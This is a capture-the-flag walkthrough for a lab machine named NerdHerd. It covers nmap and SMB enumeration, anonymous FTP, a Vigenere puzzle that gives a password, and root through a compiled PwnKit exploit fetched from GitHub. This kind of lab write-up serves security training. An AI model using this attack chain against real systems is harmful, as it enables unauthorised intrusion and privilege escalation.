
# ***NerdHerd***

## *User flag*

We'll start with nmap scan:

```bash
$ sudo nmap 10.10.107.206 -Pn -p- -A -vv -T4 --script discovery,vuln -oN nmap-scan --min-parallelism 55
```

Fet services:

```bash
$ cat nmap-scan | grep -o -e '[0-9]\+/tcp[[:space:]].*'
```

- [ ] 21/tcp   open  ftp         syn-ack ttl 63 vsftpd 3.0.3
- [ ] 22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
- [ ] 139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X: 4.X (workgroup: WORKGROUP)
- [ ] 445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
- [ ] 1337/tcp open  http        syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))

Let's start with FTP server and see if have anonymous access. And we do! After
logging in as "anonymous" we have 2 files:

```
- /pub/youfoundme.png
- /pub/.jokesonyou/hellon3rd.txt
```

The txt file:

```
all you need is in the leet
```

Run `exiftool` on the image and get the owner name:

```
Owner Name  : fijbxslz
```

Next thing I did was checking SMB services, but we don't have access there.

Let's move on to http server. On the bottom there's a youtube link to the song
"Surfin Bird". Google the lyrics and pay attention to the phrase "bird's the word".
Let's try Vigenere's cipher with Owner's name as ciphertext and "birdistheword" as 
key. We got:

> easypass

Let's enumerate SMB services:

```bash
$ enum4linux 10.10.107.206
```

It seems that there are 2 users:

- S-1-22-1-1000 Unix User\chuck (Local User)
- S-1-22-1-1002 Unix User\ftpuser (Local User)

Let's try to login using smbclient with these credentials:

> chuck:easypass

into nerdherd_classified share:

```bash
$ smbclient -U chuck //10.10.107.206/nerdherd_classified
```

There's a secr3t.txt file with the following content:

```
Ssssh! don't tell this anyone because you deserved it this far:

        check out "/this1sn0tadirect0ry"

Sincerely,
        0xpr0N3rd
<3
```

At http://10.10.107.206:1337/this1sn0tadirect0ry/creds.txt we can find a note:

```
alright, enough with the games.

here, take my ssh creds:
	
	chuck : th1s41ntmypa5s
```

Login with these credentials and get the User flag!

---

## *Root & Bonus flags*

I tried some manual enumeration, but couldn't find an obvoius way of exploiting the 
machine. So I transferred linpeass.sh script to the machine and launched it.

Turns out, it's vulnerable to Pwnkit!

Clone the exploit from [5l1v3r1's Github](https://github.com/5l1v3r1/PwnKit-1)

Compile the exploit:

```bash
$ gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
```

Transfer PwnKit file to the machine and execute it.

Search for root's flag:

```bash
$ find / -type f -iname "*root.txt*" 2>/dev/null
```

The Bonus flag can be found in root's .bash_history file.

